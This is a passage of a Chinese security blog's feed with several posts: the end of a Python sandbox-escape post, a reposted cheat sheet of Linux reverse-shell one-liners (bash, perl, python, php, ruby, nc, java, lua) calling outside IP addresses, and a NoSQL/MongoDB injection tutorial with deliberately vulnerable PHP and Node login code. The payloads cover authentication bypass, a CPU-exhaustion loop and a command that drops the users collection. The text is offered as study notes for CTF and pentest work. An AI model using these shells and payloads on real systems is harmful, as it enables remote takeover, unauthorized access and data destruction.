class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;if [ $(whoamicut -c 1) = q ];then sleep 2;fi;&#x27;)&quot;</span>, number = <span class="number">1</span>)</span><br><span class="line"><span class="number">0.009487152099609375</span></span><br></pre></td></tr></table></figure><h4 id="platform">platform</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.popen(<span class="string">&#x27;id&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,bufsize=<span class="number">1</span>).read()</span><br></pre></td></tr></table></figure><h3 id="基于黑名单">基于黑名单</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># 使用字符串拼接绕过</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)].__dict__[<span class="string">&#x27;c3lzdGVt&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># 使用base64编码绕过</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> misc篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>(转)linux反弹shell方法</title>
      <link href="/2018/07/02/%E8%BD%AClinux%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E6%B3%95/"/>
      <url>/2018/07/02/%E8%BD%AClinux%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>整理一下吧,以后懒得到处找了,存blog了</p><h3 id="bash">bash</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h3 id="perl">perl</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="python">python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="php">php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="ruby">ruby</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="nc">nc</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 1234</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f/bin/sh -i 2&gt;&amp;1nc 10.0.0.1 1234 &gt;/tmp/f</span><br><span class="line">nc x.x.x.x 8888/bin/shnc x.x.x.x 9999</span><br></pre></td></tr></table></figure><h3 id="java">java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5  while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><h3 id="lua">lua</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;10.0.0.1&#x27;,&#x27;1234&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><h3 id="nc不用-e">nc不用-e</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Hacker:nc -lvnp listenport</span><br><span class="line">Victim:mknod /tmp/backpipe p</span><br><span class="line">Victim:/bin/sh 0&lt;/tmp/backpipe  nc attackerip listenport 1&gt;/tmp/backpipe</span><br><span class="line">不使用nc</span><br><span class="line"></span><br><span class="line">Method 1:</span><br><span class="line">Hacker: nc -nvlpp 8080</span><br><span class="line">Victim: /bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">Method 2:</span><br><span class="line">Hacker: nc -nvlpp8080</span><br><span class="line">Victim: mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe</span><br><span class="line"></span><br><span class="line">Method 3:</span><br><span class="line">Hacker: nc -nvlpp8080</span><br><span class="line">Hacker: nc -nvlpp8888</span><br><span class="line">Victim: telnet 173.214.173.151 8080  /bin/bash  telnet 173.214.173.151 8888</span><br></pre></td></tr></table></figure><p>原文链接：<a href="https://www.waitalone.cn/linux-shell-rebound-under-way.html" title="https://www.waitalone.cn/linux-shell-rebound-under-way.html">https://www.waitalone.cn/linux-shell-rebound-under-way.html</a></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NOSQL注入学习</title>
      <link href="/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>续上一篇mongodb注入的博客,其实大体差不多,新增了一些js的注入问题和driver的mongodb shell的命令执行问题,学习的参考链接 <a href="https://www.anquanke.com/post/id/97211" title="https://www.anquanke.com/post/id/97211">https://www.anquanke.com/post/id/97211</a></p><h3 id="概述">概述</h3><p>首先说下NOSQL的注入,NoSQL泛指非关系型数据库,相比传统的SQL数据库有更宽松的一致性限制,它通过减少关系约束和一致性检查来提供更好的性能和扩展性,但即使没有使用sql的语法,它们依然可以被攻击,而且由于NoSQL注入可以在程序语言中执行,而不是在声明式SQL语言中执行,所以潜在的影响要更大. NoSQL的调用是通过应用程序的语言来编写的,所以过滤掉常见的HTML特殊字符并不能阻止Nosql攻击 分类我们直接按传统sql分类来看吧</p><h3 id="nosql注入分类">NoSQL注入分类</h3><p>(1)永真式 也就是通过注入代码,让生成的表达式结果永远为真,从而绕过认证,可以脑补'or'1'='1 (2)联合查询 通过参数来改变查询的数据集来绕认证,脑补' and false union select 1,md5(1)%23 (3)javascript注入 新的漏洞,由允许执行数据中的js的NoSQL数据库引入. js使得在数据引擎进行复杂事务和查询成为可能。传递不干净的用户输入可以注入js代码,导致非法数据获取</p><h3 id="php中的nosql注入">php中的NoSQL注入</h3><h4 id="重言注入">重言注入</h4><p>拿文中代码为例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>(<span class="string">&quot;mongodb://mongo:27017&quot;</span>);</span><br><span class="line"><span class="variable">$dbUsername</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$dbPassword</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>],</span><br><span class="line"><span class="string">&#x27;password&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"></span><br><span class="line">); </span><br><span class="line"><span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line"><span class="variable">$doc_failed</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$doc_failed</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;failed.html&quot;</span>);</span><br><span class="line"><span class="variable">$doc_succeed</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$doc_succeed</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;succeed.html&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$doc_succeed</span>-&gt;<span class="title function_ invoke__">saveHTML</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$doc_failed</span>-&gt;<span class="title function_ invoke__">saveHTML</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个简单的登录处理,data变量存在注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:username[$ne]=1&amp;password[$ne]=1</span><br></pre></td></tr></table></figure><h4 id="联合查询注入">联合查询注入</h4><p>随意看下,这个还是自由发挥吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string query =&quot;&#123; username: &#x27;&quot; + post_username + &quot;&#x27;, password: &#x27;&quot; + post_password + &quot;&#x27; &#125;&quot;</span><br><span class="line">payload:</span><br><span class="line"></span><br><span class="line">username=tolkien&#x27;, $or: [ &#123;&#125;, &#123; &#x27;a&#x27;:&#x27;a&amp;password=&#x27; &#125; ]</span><br></pre></td></tr></table></figure><h4 id="javascript注入">JavaScript注入</h4><h5 id="where操作符">where操作符</h5><p>在mongodb中,where操作符是可以执行js语句的,Mongodb2.4之前的$where可以使用map-reduce,group来访问mongo shell中的全局变量和属性 给出示例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>(<span class="string">&quot;mongodb://mongo:27017&quot;</span>);</span><br><span class="line"><span class="variable">$query_body</span> =<span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;$where&#x27;</span>=&gt;<span class="string">&quot;</span></span><br><span class="line"><span class="string">function q() </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    var username = &quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    var password = &quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&quot;password&quot;</span>].<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    if(username == &#x27;admin&#x27;&amp;&amp;password == &#x27;123456&#x27;) </span></span><br><span class="line"><span class="string">        return true; </span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">        &#123; </span></span><br><span class="line"><span class="string">            return false;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="variable">$query_body</span>);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line"><span class="variable">$doc_failed</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$doc_failed</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;failed.html&quot;</span>);</span><br><span class="line"><span class="variable">$doc_succeed</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$doc_succeed</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;succeed.html&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$doc_succeed</span>-&gt;<span class="title function_ invoke__">saveHTML</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$doc_failed</span>-&gt;<span class="title function_ invoke__">saveHTML</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在这里注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：username=1&amp;password=1;return true;</span><br></pre></td></tr></table></figure><p>查看数据流 <img src="/images/2018/06/jsinjection.png" alt="blacsheep" /> php先将参数加到js里面,然后形成了一个奇奇怪怪的js,这个js返到mongodb里,然后在查询的时候,服务器执行了我们想要执行的js,从而绕过验证 然后文中一个让mongodb服务器cpu飙升的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&amp;password=1;(function()&#123;var%20date%20=%20new%20Date();%20do&#123;curDate%20=%20new%20Date();&#125;while(curDate-date%3C5000);%20return%20Math.max();&#125;)();</span><br></pre></td></tr></table></figure><h5 id="command方法注入">Command方法注入</h5><p>php官方已经友情提示不要使用了,但还是难免有人为了实现奇怪的功能去使用,给出示例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>(<span class="string">&quot;mongodb://mongo:27017&quot;</span>);</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Command</span>([</span><br><span class="line">// build the <span class="string">&#x27;distinct&#x27;</span> command</span><br><span class="line"><span class="string">&#x27;eval&#x27;</span>=&gt; <span class="string">&quot;db.users.distinct(&#x27;username&#x27;,&#123;&#x27;username&#x27;:&#x27;<span class="subst">$username</span>&#x27;&#125;)&quot;</span></span><br><span class="line">]);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeCommand</span>(<span class="string">&#x27;test&#x27;</span>, <span class="variable">$cmd</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cursor</span>);</span><br><span class="line"><span class="variable">$doc_failed</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$doc_failed</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;failed.html&quot;</span>);</span><br><span class="line"><span class="variable">$doc_succeed</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$doc_succeed</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;succeed.html&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$doc_succeed</span>-&gt;<span class="title function_ invoke__">saveHTML</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$doc_failed</span>-&gt;<span class="title function_ invoke__">saveHTML</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cmd那里存在拼接的Mongodb的shell执行,如果应用连接的数据库权限够高,我们可以干的事情就很多,比如可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:username=2′&#125;);db.users.drop();db.user.find(&#123;‘username’:’2</span><br></pre></td></tr></table></figure><p>删库跑路了解一下</p><h3 id="node.js中的nosql注入">Node.js中的NoSQL注入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line">mongoose.<span class="title function_">connect</span>(<span class="string">&#x27;mongodb://localhost/test&#x27;</span>, &#123; <span class="attr">useMongoClient</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">UserSchema</span> = <span class="keyword">new</span> mongoose.<span class="title class_">Schema</span>(&#123;</span><br><span class="line"><span class="attr">name</span>: <span class="title class_">String</span>,</span><br><span class="line"><span class="attr">username</span>: <span class="title class_">String</span>,</span><br><span class="line"><span class="attr">password</span>: <span class="title class_">String</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">User</span> = mongoose.<span class="title function_">model</span>(<span class="string">&#x27;users&#x27;</span>, <span class="title class_">UserSchema</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, __dirname);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;jade&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>()); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line"><span class="title class_">User</span>.<span class="title function_">findOne</span>(&#123;<span class="attr">username</span>: req.<span class="property">body</span>.<span class="property">username</span>, <span class="attr">password</span>: req.<span class="property">body</span>.<span class="property">password</span>&#125;, <span class="keyword">function</span> (<span class="params">err, user</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user)</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">message</span>: err.<span class="property">message</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!user) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;Sorry!&#x27;</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;Welcome back &#x27;</span> + user.<span class="property">name</span> + <span class="string">&#x27;!!!&#x27;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">49090</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;listening on port %d&#x27;</span>, server.<span class="title function_">address</span>().<span class="property">port</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>打扰了,不会nodejs,虽然分析主要部分还是没啥问题的.. payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST http://127.0.0.1:49090/</span><br><span class="line">HTTP/1.1Content-Type: application/json&#123;</span><br><span class="line">&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;: null&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mongodb下的sql注入</title>
      <link href="/2018/06/29/mangodb%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/06/29/mangodb%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>前几天看到安恒杯里有一道Mongodb的注入题,搜了一下相关的东西,发现也是比较老的东西了,这里写篇博客记录一下吧..</p><h3 id="概括">概括</h3><p>php中操作mongo类可以用下面两种方法 (1)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$mongo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mongoclient</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="variable">$mongo</span>-&gt;myinfo; <span class="comment">//选择数据库</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$coll</span> = <span class="variable">$db</span>-&gt;test; <span class="comment">//选择集合</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$coll</span>-&gt;<span class="title function_ invoke__">save</span>();    <span class="comment">//增</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$coll</span>-&gt;<span class="title function_ invoke__">find</span>();    <span class="comment">//查</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$coll</span>-&gt;<span class="title function_ invoke__">remove</span>();    <span class="comment">//减</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$coll</span>-&gt;<span class="title function_ invoke__">update</span>();    <span class="comment">//改</span></span><br></pre></td></tr></table></figure><p>传入的是一个数组,后面会讲到,这里不细说 (2)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$mongo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mongoclient</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="variable">$mongo</span>-&gt;myinfo; <span class="comment">//选择数据库</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;db.table.save(&#123;&#x27;newsid&#x27;:1&#125;)&quot;</span>;    <span class="comment">//增</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;db.table.find(&#123;&#x27;newsid&#x27;:1&#125;)&quot;</span>;    <span class="comment">//查</span></span><br><span 